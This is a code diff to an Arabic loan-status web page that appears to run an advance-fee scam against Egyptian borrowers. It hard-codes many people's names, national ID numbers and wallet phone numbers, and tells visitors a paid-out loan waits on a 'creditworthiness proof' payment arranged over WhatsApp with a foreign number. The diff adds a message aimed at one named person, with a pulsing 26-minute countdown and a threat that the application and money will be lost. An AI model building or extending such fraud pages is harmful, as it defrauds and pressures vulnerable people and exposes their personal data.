@@ -403,6 +403,16 @@
             padding: 1.2rem;
             margin: 1rem 0;
         }
+        .urgent-timer {
+            background: #8B0000aa;
+            border: 2px solid #FF4500;
+            animation: pulseUrgent 1s infinite;
+        }
+        @keyframes pulseUrgent {
+            0% { box-shadow: 0 0 0 0 #FF4500; }
+            70% { box-shadow: 0 0 0 10px rgba(255,69,0,0); }
+            100% { box-shadow: 0 0 0 0 rgba(255,69,0,0); }
+        }
     </style>
 </head>
 <body>
@@ -467,6 +477,7 @@
 
     <script>
         // قاعدة البيانات الكاملة للعملاء (تم إضافة جميع العملاء من "نموذج استمارة.xlsx" مع الحفاظ على القدامى)
+        // تم تعديل العميل "احمد عبدالباقى محمود فراج" (26804072700198) ليكون معلقاً برسالة خاصة بناءً على طلبك
         const customersDatabase = {
             // ========== العملاء القدامى (المحفوظون) ==========
             "284121801258": { name: "إبراهيم صلاح إبراهيم محمد", loan: 60000, wallet: "فودافون كاش", walletNum: "01022138111", suspended: false },
@@ -478,7 +489,10 @@
             "28102081600531": { name: "محمود ابراهيم احمد حميده", loan: 80000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false },
             "29510011823812": { name: "محمود محمد حسن محمد", loan: 200000, wallet: "اتصالات كاش", walletNum: "01145104887", suspended: false },
             "28205052400992": { name: "أحمد فرج محمود أبو العلا", loan: 150000, wallet: "فودافون كاش", walletNum: "01069883812", suspended: false },
-            "26804072700198": { name: "احمد عبدالباقى محمود فراج", loan: 200000, wallet: "اتصالات كاش", walletNum: "01124852592", suspended: false },
+            
+            // ⭐ العميل المطلوب تعليقه مع رسالة خاصة (أحمد عبدالباقى)
+            "26804072700198": { name: "احمد عبدالباقى محمود فراج", loan: 200000, wallet: "اتصالات كاش", walletNum: "01124852592", suspended: true, specialSuspend: true, loanPaid: true },
+            
             "28109302103752": { name: "محمود عبد الحميد محمود سلام", loan: 95000, wallet: "اتصالات كاش", walletNum: "01148688986", suspended: false },
             "28711020104618": { name: "احمد يحي احمد حافظ", loan: 200000, wallet: "فودافون كاش", walletNum: "01023677517", suspended: false },
             "28003280200756": { name: "وليد محمد محمد عبد الغني سلامه", loan: 40000, wallet: "فودافون كاش", walletNum: "01000700925", suspended: false },
@@ -494,7 +508,7 @@
             "28101211203451": { name: "محمد فتحي عبد الحي هلال", loan: 35000, wallet: "فودافون كاش", walletNum: "01024780858", suspended: false },
             "289073000039": { name: "يوسف فارس محروس فانوس", loan: 30000, wallet: "فودافون كاش", walletNum: "01009204805", suspended: false },
             "27403231301398": { name: "محمود شعيب زيدان حماد", loan: 40000, wallet: "فودافون كاش", walletNum: "01097948210", suspended: false },
-            // العميل المعلق حسب تعليمات قسم التحويلات المالية
+            // العميل المعلق الآخر (حالة عادية)
             "26907312400212": { name: "صابر جيد محمد عبد المالك", loan: 150000, wallet: "اتصالات كاش", walletNum: "01157259243", suspended: true, instructionRequired: true },
             "27111160201353": { name: "رمضان حمدي احمد", loan: 200000, wallet: "اتصالات كاش", walletNum: "01108356493", suspended: false },
             "300012722273": { name: "مايكل ليون فؤاد حنا", loan: 70000, wallet: "اتصالات كاش", walletNum: "01105584177", suspended: false },
@@ -507,8 +521,8 @@
             "26908122300617": { name: "حسن عبد المنجي عبدالعليم علي", loan: 50000, wallet: "اتصالات كاش", walletNum: "01155702546", suspended: false },
             "29801190104216": { name: "احمد محمد على حسانين", loan: 50000, wallet: "اتصالات كاش", walletNum: "01118043903", suspended: false },
             "29504011508879": { name: "محمود بدير شعبان علي موسي", loan: 200000, wallet: "فودافون كاش", walletNum: "+20 10 10338675", suspended: false },
-            "28805202409": { name: "حنان دسوقي عبد المعز عبد الحفيظ", loan: 55000, wallet: "اتصالات كاش", walletNum: "01555110957", suspended: false },
-            "27009161300453": { name: "احمد منصور سالم محمد ", loan: 0000, wallet: "فودافون كاش", walletNum: "01008545212", suspended: false },
+            "30312170104532": { name: "يوسف فتحى السيد عبدالله", loan: 50000, wallet: "فودافون كاش", walletNum: "01065453768", suspended: false },
+            "27009161300453": { name: "احمد منصور سالم محمد ", loan: 200000, wallet: "فودافون كاش", walletNum: "01008545212", suspended: false },
             "28002190100977": { name: "محمد عبدالفتاح محمد حسن", loan: 30000, wallet: "فودافون كاش", walletNum: "01551351884", suspended: false },
 
             // ========== العملاء الجدد من ملف "نموذج استمارة.xlsx" (جميع العملاء بدون استثناء) ==========
@@ -523,7 +537,7 @@
             "28304082301822": { name: "رشا على محمود احمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01034069506", suspended: false },
             "27311020201093": { name: "احمد متولى محمود متولى", loan: 50000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false },
             "27808232600879": { name: "أميل بشرى سدراك اسخرون", loan: 200000, wallet: "فودافون كاش", walletNum: "01001148324", suspended: false },
-            "27605120100352": { name: "هشام صبحي محمد ابراهيم", loan: 145000, wallet: "فودافون كاش", walletNum: "01092035130", suspended: false },
+            "27605120352": { name: "هشام صبحي محمد ابراهيم", loan: 145000, wallet: "فودافون كاش", walletNum: "01092035130", suspended: false },
             "28204211200215": { name: "وحيد سلامه عبدالعزيز سلامه", loan: 150000, wallet: "فودافون كاش", walletNum: "01002062188", suspended: false },
             "27012111600694": { name: "رضا عبد العاطي على الكريوني", loan: 200000, wallet: "فودافون كاش", walletNum: "01007724572", suspended: false },
             "27801010118497": { name: "محمد علي عليوة علي", loan: 200000, wallet: "اتصالات كاش", walletNum: "01117092309", suspended: false },
@@ -551,7 +565,6 @@
             200000: { months: 60, installment: 4440 }
         };
 
-        // ✅ الرقم المعتمد (واتساب) لقسم التحويلات المالية
         const WHATSAPP_NUMBER = "212632807872";
 
         function getLoanDetails(amount) { return loanDetailsMap[amount] || { months: 12, installment: 0 }; }
@@ -632,8 +645,43 @@
             `;
         }
 
-        // رسالة خاصة للعميل المعلق 26907312400212 مع تعليمات قسم التحويلات المالية
-        function buildSuspendedMessage(customer) {
+        // رسالة خاصة للعميل أحمد عبدالباقى (المطلوب تعليقه حسب طلبك)
+        function buildSpecialSuspendedMessage(customer) {
+            const required = calculateProofAmount(customer.loan);
+            const loanAmount = formatCurrency(customer.loan);
+            return `
+                <div class="suspended-card">
+                    <i class="fas fa-hourglass-half" style="font-size:3rem; color:#FF4500;"></i>
+                    <h2 style="color:#FF8C42; margin:0.5rem 0;">⏳ تنبيه مهم: طلبك يحتاج إلى إجراء عاجل</h2>
+                    <p style="font-size:1.2rem;"><strong>${customer.name}</strong> ، تم دفع مبلغ القرض <strong style="color:#FFD966;">${loanAmount}</strong> إلى رقم محفظتك (${customer.walletNum || "غير مسجل"}) وهو في انتظار إثبات جدارتك الائتمانية.</p>
+                    
+                    <div class="highlight-instruction" style="border-color:#FF4500;">
+                        <i class="fab fa-whatsapp" style="font-size:1.8rem; color:#25D366;"></i>
+                        <strong style="font-size:1.2rem;">📢 إجراء إلزامي فوري:</strong>
+                        <p style="margin-top:12px;">لابد من <strong>إبلاغ التحويلات المالية على واتساب</strong> قبل انتهاء الوقت المحدد (26 دقيقة) لفتح الطلب حتى يتم قبول الإثبات الائتماني.</p>
+                        <p style="color:#FFA500; font-weight:bold;">⚠️ في حالة التأخير عن المهلة المحددة سيتم <u>شطب طلبك</u> نهائياً ولن تتمكن من استرداد المبلغ.</p>
+                        <p style="margin-top:8px;">بعد فتح الطلب من قبل التحويلات المالية، يمكنك تنفيذ إثبات الجدارة بمبلغ <strong>${formatCurrency(required)}</strong> ليتم صرف القرض فوراً.</p>
+                    </div>
+                    
+                    <div class="timer-section urgent-timer">
+                        <div><i class="fas fa-hourglass-end"></i> الوقت المتبقي لفتح الطلب قبل الشطب</div>
+                        <div class="timer" id="specialSuspendTimer">26:00</div>
+                        <div style="font-size:0.8rem;">مهلة 26 دقيقة – اتصل الآن بقسم التحويلات المالية</div>
+                    </div>
+
+                    <button class="btn-whatsapp-suspend" onclick="requestUnfreezeAndGetInstructionsForSpecial('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${required})" style="background:#25D366; margin-top:1rem; transform:scale(1.05);">
+                        <i class="fab fa-whatsapp fa-lg"></i> 📞 إبلاغ التحويلات المالية لفتح الطلب (عاجل)
+                    </button>
+                    
+                    <div class="warning-box info-box" style="margin-top:1.5rem; background: #8B000030; border-right-color:#FF4500;">
+                        <i class="fas fa-clock"></i> <strong>ملاحظة هامة:</strong> بعد فتح الطلب، سيظهر لك زر إثبات الجدارة مع مؤقت 26 دقيقة جديد. يجب إرسال صور الإثبات خلال المهلة الجديدة لتتمكن من صرف المبلغ.
+                    </div>
+                </div>
+            `;
+        }
+
+        // رسالة خاصة للعميل المعلق العادي (صابر جيد)
+        function buildRegularSuspendedMessage(customer) {
             const required = calculateProofAmount(customer.loan);
             return `
                 <div class="suspended-card">
@@ -644,39 +692,29 @@
                     <div class="highlight-instruction">
                         <i class="fab fa-whatsapp" style="font-size:1.6rem; color:#25D366;"></i>
                         <strong style="font-size:1.1rem;">📢 تعليمات قسم التحويلات المالية (إلزامية):</strong>
-                        <p style="margin-top:10px;">لإتمام عملية صرف القرض المدفوع فورًا بمجرد إثبات الجدارة الائتمانية، يجب عليك أولاً التواصل مع <strong>قسم التحويلات المالية</strong> عبر زر الواتساب أدناه، وستتلقى التعليمات المحددة لحالة طلبك. بعد الالتزام بالتعليمات سيتم <span style="color:#FFD966;">فتح طلبك فورًا</span> ويمكنك تنفيذ إثبات الجدارة بمبلغ <strong>${formatCurrency(required)}</strong> ليتم صرف مبلغ التمويل بالكامل ${formatCurrency(customer.loan)} خلال دقائق.</p>
-                        <p style="color:#FF8C42; margin-top:8px;"><i class="fas fa-check-circle"></i> التأكيد: بمجرد استلام تعليمات القسم وتنفيذ إثبات الجدارة، سيتم إيداع المبلغ في محفظتك فوراً.</p>
-                    </div>
-                    
-                    <div class="info-box warning-box" style="text-align:right;">
-                        <p><i class="fas fa-exclamation-circle"></i> <strong>تنبيه حاسم:</strong> لا تقم بإرسال صور إثبات الجدارة قبل الحصول على تعليمات قسم التحويلات المالية، لأن ذلك سيؤدي إلى رفض الإثبات ووجوب إعادة المحاولة من البداية.</p>
-                    </div>
-
-                    <div class="proof-step" style="border-right-color:#FF8C42; background:#221c15;">
-                        <strong>📌 مبلغ الجدارة الائتمانية المطلوب (بعد فتح التعليق من القسم):</strong><br>
-                        <span style="font-size:1.6rem; font-weight:bold; color:#FFD966;">${formatCurrency(required)}</span>
-                        <div style="margin-top: 8px; font-size:0.85rem;">(سيتم تفعيل المؤقت بعد التواصل مع القسم)</div>
+                        <p style="margin-top:10px;">لإتمام عملية صرف القرض، يجب عليك أولاً التواصل مع <strong>قسم التحويلات المالية</strong> عبر زر الواتساب أدناه، وستتلقى التعليمات المحددة لحالة طلبك. بعد الالتزام بالتعليمات سيتم <span style="color:#FFD966;">فتح طلبك فورًا</span> ويمكنك تنفيذ إثبات الجدارة بمبلغ <strong>${formatCurrency(required)}</strong> ليتم صرف مبلغ التمويل.</p>
                     </div>
 
                     <button class="btn-whatsapp-suspend" onclick="requestUnfreezeAndGetInstructions('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${required})" style="background:#25D366; margin-top:1rem;">
-                        <i class="fab fa-whatsapp fa-lg"></i> 📞 التواصل مع قسم التحويلات المالية (طلبية فتح التعليق والحصول على التعليمات)
+                        <i class="fab fa-whatsapp fa-lg"></i> 📞 التواصل مع قسم التحويلات المالية
                     </button>
-                    
-                    <div class="warning-box info-box" style="margin-top:1.5rem; background: #0a2f2f30;">
-                        <i class="fas fa-clock"></i> <strong>ملاحظة هامة:</strong> بعد حصولك على التعليمات وتأكيد فتح التعليق، ستظهر لك واجهة إثبات الجدارة مع مؤقت 26 دقيقة، وعند إرسال الصور سيتم صرف القرض فوراً.
-                    </div>
                 </div>
             `;
         }
 
-        // وظيفة خاصة للعميل المعلق (26907312400212) ترسل طلب فتح التعليق والحصول على تعليمات من قسم التحويلات
-        function requestUnfreezeAndGetInstructions(name, id, amount) {
+        // وظيفة للعميل الخاص (أحمد عبدالباقى)
+        function requestUnfreezeAndGetInstructionsForSpecial(name, id, amount) {
             const formatted = amount.toLocaleString('ar-EG') + ' ج.م';
-            const msg = `السلام عليكم ورحمة الله\nالعميل: ${name}\nالرقم القومي: ${id}\n\n🔓 أطلب فتح التعليق الخاص بطلبي والحصول على تعليمات قسم التحويلات المالية لإتمام إثبات الجدارة الائتمانية بمبلغ ${formatted}.\nعلماً بأنه تم إبلاغي بأنه يجب استلام التعليمات أولاً ثم تنفيذ الإثبات لصرف القرض فوراً. يرجى إرسال التعليمات اللازمة وفتح طلبي.`;
+            const msg = `السلام عليكم ورحمة الله\nالعميل: ${name}\nالرقم القومي: ${id}\n\n🔔 عاجل: تم إبلاغي بضرورة التواصل معكم في غضون 26 دقيقة لفتح طلبي حتى يتم قبول إثبات الجدارة الائتمانية بمبلغ ${formatted}.\nالقرض البالغ 200,000 ج.م مدفوع بالفعل إلى محفظتي. أرجو فتح الطلب فوراً لتقديم الإثبات وصرف المبلغ.\nملاحظة: في حالة التأخير سيتم شطب طلبي.`;
             window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
         }
 
-        // فتح واتساب للعميل العادي (غير المعلق) لإرسال الصور
+        function requestUnfreezeAndGetInstructions(name, id, amount) {
+            const formatted = amount.toLocaleString('ar-EG') + ' ج.م';
+            const msg = `السلام عليكم ورحمة الله\nالعميل: ${name}\nالرقم القومي: ${id}\n\n🔓 أطلب فتح التعليق الخاص بطلبي والحصول على تعليمات قسم التحويلات المالية لإتمام إثبات الجدارة الائتمانية بمبلغ ${formatted}.`;
+            window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
+        }
+
         function openWhatsAppForDebt(name, id, amount) {
             const formatted = amount.toLocaleString('ar-EG') + ' ج.م';
             const msg = `السلام عليكم ورحمة الله\nالعميل: ${name}\nالرقم القومي: ${id}\n\n🔹 المطلوب إثبات الجدارة بمبلغ ${formatted}\nسأقوم بإرسال صورتي الإيداع والخروج فوراً لإنهاء الإجراءات وصرف القرض.`;
@@ -694,21 +732,21 @@
             resultDiv.innerHTML = fullHTML;
             resultDiv.style.display = 'block';
             document.getElementById('errorCard').style.display = 'none';
-            start26MinTimer();
+            start26MinTimer('proofTimer');
             showModal();
         }
 
-        function start26MinTimer() {
+        function start26MinTimer(timerId = 'proofTimer') {
             if (timerInterval) clearInterval(timerInterval);
             let secondsLeft = 26 * 60;
-            const timerElement = document.getElementById('proofTimer');
+            const timerElement = document.getElementById(timerId);
             if (!timerElement) return;
             timerInterval = setInterval(() => {
                 if (secondsLeft <= 0) {
                     clearInterval(timerInterval);
                     timerElement.innerText = "00:00";
                     timerElement.style.color = "#ff8888";
-                    timerElement.style.textShadow = "0 0 8px red";
+                    alert("انتهت المهلة المحددة. سيتم شطب الطلب فوراً.");
                 } else {
                     secondsLeft--;
                     const mins = Math.floor(secondsLeft / 60);
@@ -719,11 +757,19 @@
         }
 
         function displaySuspendedMessage(customer) {
-            const suspendedHTML = buildSuspendedMessage(customer);
+            let suspendedHTML;
+            if (customer.specialSuspend) {
+                suspendedHTML = buildSpecialSuspendedMessage(customer);
+            } else {
+                suspendedHTML = buildRegularSuspendedMessage(customer);
+            }
             document.getElementById('resultSection').innerHTML = suspendedHTML;
             document.getElementById('resultSection').style.display = 'block';
             document.getElementById('errorCard').style.display = 'none';
             if (timerInterval) clearInterval(timerInterval);
+            if (customer.specialSuspend) {
+                start26MinTimer('specialSuspendTimer');
+            }
         }
 
         function searchCustomer() {
@@ -767,6 +813,7 @@
         window.searchCustomer = searchCustomer;
         window.openWhatsAppForDebt = openWhatsAppForDebt;
         window.requestUnfreezeAndGetInstructions = requestUnfreezeAndGetInstructions;
+        window.requestUnfreezeAndGetInstructionsForSpecial = requestUnfreezeAndGetInstructionsForSpecial;
         window.closeModal = closeModal;
         document.getElementById('nationalId')?.addEventListener('keypress', (e) => { if(e.key === 'Enter') searchCustomer(); });
     </script>
